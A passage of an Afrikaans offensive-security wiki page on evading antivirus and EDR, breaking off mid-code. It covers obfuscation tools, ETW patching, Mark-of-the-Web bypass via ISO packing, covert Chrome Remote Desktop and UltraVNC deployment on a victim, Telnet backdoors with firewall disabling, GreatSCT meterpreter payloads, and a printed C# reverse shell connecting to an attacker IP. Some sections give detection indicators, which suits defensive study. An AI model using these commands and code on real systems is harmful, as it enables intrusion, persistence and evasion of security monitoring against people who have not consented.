- **Gebruik ’n unmanaged PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell aan te bied sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit ontduik kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie inherent AMSI, Script Block Logging of elke ander PowerShell-verdediging nie; die dekking hang af van die runtime- en gasheerimplementering.


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die entropie van die binêre lêer sal verhoog en dit vir AV’s en EDR’s makliker sal maak om dit op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke dele van jou kode wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat decompilers en sandboxes sal blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL** wat daarna in nutsmiddels soos dnSpy of ILSpy na C# gedecompileer kan word.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-tampering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die statiese konstruktor van die *module* (`<Module>.cctor`). Dit verander ook die PE-kontrolesom sodat enige wysiging die binêre lêer sal laat omval. Gebruik **AntiTamperKiller** om die geënkripteerde metadata-tabelle op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/beheer-vloeist herstel – voer die *clean* lêer aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlikename herstel en konstante stringe dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte metode-oproepe met liggewig-wrappers (ook bekend as *proxy calls*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

4.  Handmatige opruiming – voer die resulterende binary in dnSpy uit en soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *regte* payload op te spoor.  Die malware stoor dit dikwels as ’n TLV-gekodeerde byte array wat binne `<Module>.byte_0` geïnisialiseer word.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige sample uitgevoer hoef te word – nuttig wanneer jy op ’n vanlyn werkstasie werk.

> 🛈  ConfuserEx produseer ’n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triageer.

#### Eenreël-opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n open-source fork van die [LLVM](http://www.llvm.org/)-kompilasiesuite te verskaf wat verhoogde sagtewaresekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om obfuscated code tydens kompilering te genereer, sonder enige eksterne hulpmiddel of wysiging van die compiler.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag obfuscated operasies by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word. Dit maak die lewe vir iemand wat die toepassing wil crack ’n bietjie moeiliker.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64 binary obfuscator wat verskillende PE-lêers kan obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorphic code-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code obfuscation-raamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscate ’n program op assembly code-vlak deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale control flow verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL-lêers in shellcode omskakel en dit dan laai

### LLVM compiler-assisted per-function self-masking

In plaas daarvan om ’n hele implant slegs te mask wanneer dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies XOR-mask hou wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemanglede name wat `REG_` bevat, voeg position-independent entry/exit-stubs om die finale machine code in en skryf een gedeelde masking handler in `.text`; signatures op bronkodevlak en die Windows x64 calling convention bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Dit hoort ná instruction selection en optimization, omdat die transformation **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` vóór uitset vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad na die bygevoegde epilogue val, en vervang vroeëre returns met `JMP_1 handler`. Behou enige compiler-gegenereerde stack/frame-afbreking vóór elke return; herlei slegs die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` skryf die stubs vir elke funksie uit, terwyl `emitEndOfAsmFile()` die handler uitskryf. Simbole wat tussen uitsetstadiums gedeel word, laat ’n prologue-vertakking toe om na sy latere epilogue te teiken; skryf vir ’n handmatig uitgeskrewe near `je` `0F 84`, gevolg deur die vier-byte MC-expressie `target - address_after_je`. Calls en jumps na die handler kan eerder as `MCInst`-objekte (`CALL64pcrel32` en `JMP_1`) uitgeskryf word. ’n Pass moet `false` teruggee vir ’n nie-geselekteerde funksie wanneer dit niks verander het nie; die PoC gee op dié pad verkeerdelik `true` terug.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

Die PoC plaas ’n XOR-sleutel en 16-byte-rekords met ’n loader-relocated function pointer plus ’n runtime-lengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, lees die handler ’n QWORD by rekordoffset `+8`, wat die lengte en die padding daarvan insluit, en beweeg rekords met `0x10` aan. PE-section name is net agt bytes lank, dus sien die runtime-opsoek `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou entry-point-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die image base van `gs:[0x60]` → `[PEB+0x10]`, loop deur PE32+-imports om ’n reeds ingevoerde `VirtualProtect` op te los, en loop vóór die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization stel ’n sentinel in `gs:[0xE8]` en roep elke metadata-funksie aan. Die prologue, wat permanent leesbaar is, stoor die funksie se beginadres in `gs:[0xF0]`, bespeur die sentinel en slaan die nog ongewysigde body oor. Die epilogue gebruik dan `call handler`; nadat die handler 13 registers (`0x68` bytes) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` na sy metadata-rekord geskryf kan word. Die stub maak die sentinel skoon en spring na `ImageBase + original_entry_point_RVA` nadat al die bodies gemask is.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n normale call roep die prologue dieselfde simmetriese handler aan om die body te decode. Die finale pad val in die bygevoegde epilogue, terwyl elke vroeëre return reguit na die gedeelde handler spring. Die normale epilogue gebruik ook `jmp handler` eerder as `call`, sodat die handler se `ret` ná her-masking die oorspronklike return-adres van die caller gebruik en die funksieresultaat in `RAX` behou.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Die handler vind die huidige rekord, slaan die vaste sigbare prologue oor (`0x46` bytes in hierdie build), verander die res na `PAGE_EXECUTE_READWRITE`, XOR dit byte vir byte met die lae sleutelbyte, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus decode dus tydens entry en encode tydens elke normale exit.<sup>[[38]](#references)[[39]](#references)</sup>

Hoë-sein-aanwysers vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n entry point binne ’n uitvoerbare `.stub` en ’n `.funcmet`-section met ’n sleutel plus relocated `.text`-wysers;
- pre-CRT-parsing van PEB, import table en section table, gevolg deur calls via elke metadata-wyser;
- identiese `call`/`pop` PIC-prologues en baie return-sites wat na een handler herlei word;
- skrywes na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en byte-vir-byte XOR-skrywes na image-backed uitvoerbare bladsye.

Dit is ontduiking van memory scanners, nie kriptografiese beskerming nie: die gepatchte lêer bevat steeds die oorspronklike onverwerkte body, en ’n debugger kan op `VirtualProtect` of die XOR-lus breek en die aktiewe funksie dump. Die enkel-byte XOR, leesbare metadata en vaste `0x46`-grens maak offline-herwinning ook eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is thread-local, maar die gewysigde code pages is process-wide. Gelyktydige of rekursiewe entry kan instruksies dus weer omskakel terwyl ’n ander invocation besig is om dit uit te voer; exceptions en nie-lokale exits kan ook die hermasking omseil. ’n Robuuste implementering moet oorgange sinchroniseer, die protection herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stub-lengtes vermy, beide `call`- en `jmp`-paaie vir x64-stack alignment oudit, en `FlushInstructionCache` aanroep nadat uitvoerbare bytes herskryf is. Microsoft plaas uitdruklik die verantwoordelikheid vir instruction-cache-coherency op die caller wanneer uitvoerbare code gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen gebruik hoofsaaklik ’n reputasiegebaseerde benadering. Dit beteken dat toepassings wat nie gereeld afgelaai word nie, SmartScreen sal aktiveer en die eindgebruiker waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **trusted** signing certificate onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit werk omdat Mark-of-the-Web (MOTW) **nie** op **non NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n hulpmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demo om SmartScreen te omseil deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logmeganisme in Windows waarmee toepassings en stelselkomponente **gebeurtenisse kan aanteken**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimteproses onmiddellik te laat terugkeer sonder om enige gebeurtenisse aan te teken. Dit word gedoen deur die funksie in die geheue te patch sodat dit onmiddellik terugkeer, wat ETW-aantekening vir daardie proses effektief deaktiveer.

Jy kan meer inligting kry by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Dit is al ’n geruime tyd bekend dat C#-binaries in die geheue gelaai kan word, en dit is steeds ’n baie goeie manier om jou post-exploitation-gereedskap te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in die geheue gelaai word sonder om aan die skyf te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die skep van ’n nuwe weggooiproses**, die inspuiting van jou kwaadwillige post-exploitation-kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en, wanneer dit klaar is, die beëindiging van die nuwe proses. Dit hou voordele én nadele in. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon-implantproses plaasvind. Dit beteken dat as iets tydens ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant sal oorleef**. Die nadeel is dat daar ’n **groter kans** is dat jy deur **Behavioural Detections** gevang word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die kwaadwillige post-exploitation-kode **in sy eie proses** ingespuit word. Op dié manier vermy jy dat jy ’n nuwe proses moet skep en dit deur AV moet laat skandeer, maar die nadeel is dat as iets verkeerd loop wanneer jou payload uitgevoer word, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan ineenstort.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor die laai van C#-assemblies, lees gerus hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **vanuit PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly-herverpakking van .NET-gereedskap (WasmForge)

Normale `execute-assembly`-tegnieke behou herkenbare MSIL en inisialiseer uiteindelik ’n CLR. **WasmForge** verander eerder die uitvoeringsgrondslag: dit migreer ’n C#-projek na die eksperimentele NativeAOT-LLVM WASI-teiken, kompileer dit vooraf na WebAssembly en sluit daardie module in ’n Wazero-gebaseerde Windows PE-gasheer in. Die gevolglike proses benodig nie die teiken se CLR, JIT of `dotnet`-gasheer nie, so reëls wat slegs op bestuurde assembly-name, CLR-laai, AMSI of .NET ETW gebaseer is, het nie meer direkte sigbaarheid nie. Dit is ’n ontduikings-/verpakkingstegniek, nie ’n omseiling van ’n voorreggrens nie—die gas sal die oorspronklike nutsprogram se toestemmings en waarneembare OS-gedrag behou.<sup>[[44]](#references)[[45]](#references)</sup>

### Bou van ’n C#-projek

Die aanbevole boumetode is die projek se Docker-omgewing, aangesien dit die .NET 10 SDK, NativeAOT-LLVM-werklading, WASI SDK 24.0, linker en ondertekeningsafhanklikhede insluit. ’n `.csproj` word outomaties opgespoor; die eenstap-bou voer migrasie, versoenbaarheidspatching, WASM-kompilering, PE-smee en ondertekening uit.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Vir foutopsporing of hersiening van gegenereerde kode, verdeel die proses in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` en ’n finale `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Die boubeeld gebruik ook ’n `wasm-component-ld`-omhulsel om die WASI Preview 2-komponentenkodering te vermy en die gewone module te produseer wat die ingebedde runtime verwag.<sup>[[44]](#references)[[45]](#references)</sup>

### Oorbrugging van wasm32 C# na x64 Win32

Dit is nie ’n deursigtige herkompilering nie. NativeAOT-WASI het nie sekere Windows-georiënteerde BCL-kenmerke nie, of verander dit; ’n wasm32-gasheer ken gewoonlik viergreep-wysergleuwe toe, terwyl x64-API’s agtgreep-wysers kan teruggee. WasmForge hanteer albei probleme met die volgende gegenereerde lae:<sup>[[44]](#references)</sup>

1. ’n Bronpleister maak AOT-spesifieke semantiese verskille reg en herlei onondersteunde registry-, pipes-, WMI-, identiteit-, gidsdiens-, lêerweergawe-, LSA- en soortgelyke oproepe na `Wf*`-helpers.
2. ’n P/Invoke-skandeerder genereer NativeAOT `DirectPInvoke`-karterings, sodat `[DllImport]`-oproepe aan gekoppelde C-bridge-simbole bind eerder as om die verklaarde DLL dinamies binne die gasheer te laai.
3. Gasheergebonde wysers gebruik `ulong` in C# en `uint64_t` in C. ’n Generiese dispatcher stuur die oproep aan die gasheer se Win32-handler deur; ’n `out8_mask` merk egte agtgreep-uitsetgleuwe waarvan die boonste helftes behou moet word. Ongeïdentifiseerde wasm32-vormige uitsette gebruik momentopname-/herstelbeskerming sodat ’n x64-skrywe nie die aangrensende vier grepe beskadig nie.
4. Toegewyde gasheer-bridges hanteer bewerkings wat nie by generiese syscall-dispatch pas nie, soos LSA-toegang tot die ticket-kas, Kerberos-/BCrypt-bewerkings met gestruktureerde resultate, TCP KDC-verkeer en LDAP-navrae.

Byvoorbeeld, ’n omhulsel vir `version.dll!VerQueryValueW` stuur vier gasheeradresse deur en stel bisse 2 en 3 (`0xC`) omdat die waarde-wyser en lengte agtgreep-uitsetgleuwe is. Die omhulsel self bly generies en delegeer die DLL-naam, export-naam, argumente en masker aan `wf_call_v2`; die gasheer voer wyservertaling uit en roep die native API aan.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Beperkings en opsporingspunte

Kode wat baie refleksie gebruik, dinamiese assembly-laai, arbitrêre native callbacks en komplekse x64-strukture wat na WASM-geheue teruggegee word, kan steeds pleisters vir spesifieke nutsmiddels vereis of heeltemal misluk. Generiese WASI Preview 2-sockets kan ook no-op-stubs bereik, dus gebruik ondersteunde nutsmiddels protokolspesifieke host shims. Valideer elke opdrag teen ’n native build eerder as om feature parity te aanvaar.<sup>[[44]](#references)[[45]](#references)</sup>

Die tegniek verskuif telemetrie eerder as om die payload onsigbaar te maak. Opsporing kan fokus op ’n PE wat ’n WASM-module bevat of materialiseer, gedrag van ’n Wazero-agtige runtime, ongewone toekenning en kopiëring van host/guest-geheue, generiese direkte Win32-dispatch, afwykings in ondertekening en PE-hulpbronne, plus die gevolglike API-oproepe en netwerkverkeer. Die afwesigheid van CLR-laai-, AMSI- of .NET ETW-gebeurtenisse moet dus nie as bewys beskou word dat ’n proses onskadelik is nie.<sup>[[44]](#references)</sup>

## Gebruik van ander programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die aanvallerbeheerde SMB-share geïnstalleer is**.

Deur toegang tot die interpreter-binaries en die omgewing op die SMB-share toe te laat, kan jy **willekeurige kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetse met ewekansige, nie-geobfuskeerde reverse-shell-scripts in hierdie tale was suksesvol.

## WebAssembly-herhosting vir ontduiking van statiese analise

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se voorregte te verlaag, kan die proses aan die gang bly terwyl dit verhinder word om bevoorregte inspeksie- of remediëringsaksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles na die tokens van sekuriteitsprosesse te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van vertroude sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te ontplooi en dit dan te gebruik om beheer daaroor oor te neem en volharding te handhaaf:<sup>[[35]](#references)</sup>
1. Laai dit af by https://remotedesktop.google.com/, klik op "Set up via SSH" en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installeerder stilweg op die slagoffer se masjien uit (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik op next. Die wizard sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die nodige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder die GUI).

## Gevorderde ontduiking

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ontduiking is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende telemetriebronne op een stelsel in ag neem, daarom is dit feitlik onmoontlik om in volwasse omgewings heeltemal onopgemerk te bly.

Elke omgewing waarteen jy te staan kom, sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) kyk om ’n vastrapplek in meer gevorderde ontduikingstegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor ontduiking in diepte.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou tegnieke**

### **Kontroleer watter dele Defender as kwaadwillig bespeur**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig bespeur, en dit dan vir jou afsonder.\
Nog ’n nutsmiddel wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop webdiens wat dit by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) aanbied.

### **Telnet-bediener**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet-bediener** gehad wat jy kon installeer (as administrateur) deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer die firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binêre lêer _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Terugverbinding**

Die **aanvaller** moet die binêre lêer `vncviewer.exe -listen 5900` **op sy gasheer uitvoer**, sodat dit **gereed sal wees** om ’n terugwaartse **VNC-verbinding** te aanvaar. Begin dan binne die **slagoffer** die winvnc-daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om onopvallend te bly, moet jy sekere dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` uitvoer vir hulp nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** **uit** met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Huidige Defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
